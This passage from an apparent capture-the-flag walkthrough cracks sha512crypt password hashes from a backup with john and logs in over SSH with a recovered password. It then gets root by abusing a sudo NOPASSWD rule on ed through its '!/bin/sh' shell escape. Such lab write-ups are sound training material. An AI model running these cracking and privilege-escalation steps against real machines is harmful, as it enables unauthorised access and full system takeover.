The backup files appears to contain credentials of local users on the machine. We can use john to crack them.

**Use john to crack the credentials:**

The format of the hashes sha512crypt
```
crazyeights@es-base:~$ john --format=sha512crypt  sunset_hash 
Using default input encoding: UTF-8
Loaded 4 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Proceeding with single, rules:Single

```

- The credentials sky:sky are not for anything.

- Trying the credentials sunset:cheer14 on ssh

```
crazyeights@es-base:~$ ssh sunset@192.168.56.130
```
**Getting user.txt:**

```
sunset@sunset:~$ ls

sunset@sunset:~$ cat user.txt

```

### Privilege Escalation:

Finding what the user can run with elevated privileges:

```
sunset@sunset:~$ sudo -l
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

Looking up ed:

```
NAME
       ed - line-oriented text editor
```

- Looking up ed on GTFObins

- It can be used to break out from restricted environments by spawning an interactive system shell.

```
ed
!/bin/sh
```

#### Getting root:
```
sunset@sunset:~$ sudo ed
!/bin/bash
root@sunset:/home/sunset# cd /root
```

##### Getting root flag:
```
root@sunset:~# ls
flag.txt  ftp  server.sh
root@sunset:~# cat flag.txt
